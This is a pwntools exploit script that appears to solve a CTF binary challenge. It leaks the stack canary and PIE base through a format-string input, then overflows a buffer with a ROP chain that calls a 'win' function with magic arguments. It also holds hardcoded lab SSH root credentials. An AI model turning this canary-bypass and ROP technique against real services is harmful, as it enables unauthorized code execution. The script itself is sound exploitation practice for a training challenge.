from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn07/p02"

exe = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = exe
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/chall"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sa = p.sendafter
    sl = p.sendline
    sla = p.sendlineafter
    r = p.recv
    rn = p.recvn
    ru = p.recvuntil
    rl = p.recvline
    # === Exploit === #
    log.info("happy pwn!")
    rop = ROP(exe)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]
    pay = b"%p %p"
    sla(b"format> ", pay)
    canary = int(rn(18), 16)
    ru(b" ")
    main_addr = int(rn(14), 16)
    log.success(f"canary = {hex(canary)}")
    log.success(f"main_addr = {hex(main_addr)}")
    pie_base = main_addr - exe.sym.main
    win = pie_base + exe.sym.win
    pop_rdi = pie_base + pop_rdi
    pop_rsi = pie_base + pop_rsi
    ret = pie_base + ret
    log.success(f"win = {hex(win)}")
    offset = 0x48
    pay = flat(b"A" * offset, canary, b"A" * 0x8, ret, pop_rdi, 0x4B4B4E4F434B2026, pop_rsi, 0x70776E2D66696E61, win)
    sla(b"payload> ", pay)
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()